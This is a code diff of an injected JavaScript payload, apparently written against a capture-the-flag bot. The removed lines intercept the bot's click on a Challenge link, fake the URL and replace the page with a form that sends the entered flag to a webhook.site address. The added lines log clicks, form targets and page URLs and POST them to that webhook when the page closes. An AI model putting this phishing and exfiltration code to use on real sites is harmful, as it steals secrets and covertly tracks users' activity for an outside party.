@@ -1,31 +1,40 @@
 
 (() => {
-    // Only run on the Scoreboard
-    if (location.pathname !== '/') return;
+    const WEBHOOK =
+        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';
 
-    const link = document.querySelector('a[href="/challenge"]');
-    if (!link) return;
+    const events = [];
 
-    // Intercept the bot clicking Challenge
-    link.addEventListener('click', e => {
-        e.preventDefault();
-        e.stopImmediatePropagation();
+    function record(type, detail = '') {
+        events.push({
+            type,
+            detail,
+            url: location.href,
+            time: Date.now()
+        });
+    }
 
-        // Make Selenium see the expected URL
-        history.pushState({}, '', '/challenge');
+    record('script_loaded');
 
-        // Replace Scoreboard with the expected form
-        document.querySelector('.content').innerHTML = `
-            <fieldset>
-                <form
-                    action="https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04"
-                    method="GET"
-                >
-                    <input name="flag" autocomplete="off">
-                    <input type="hidden" name="id" value="1">
-                    <input type="submit" value="Submit">
-                </form>
-            </fieldset>
-        `;
+    document.addEventListener('click', e => {
+        record('click', e.target.outerHTML.slice(0, 200));
     }, true);
+
+    document.addEventListener('submit', e => {
+        record('submit', e.target.action);
+    }, true);
+
+    window.addEventListener('pagehide', () => {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = WEBHOOK;
+
+        const input = document.createElement('input');
+        input.name = 'events';
+        input.value = JSON.stringify(events);
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+    });
 })();
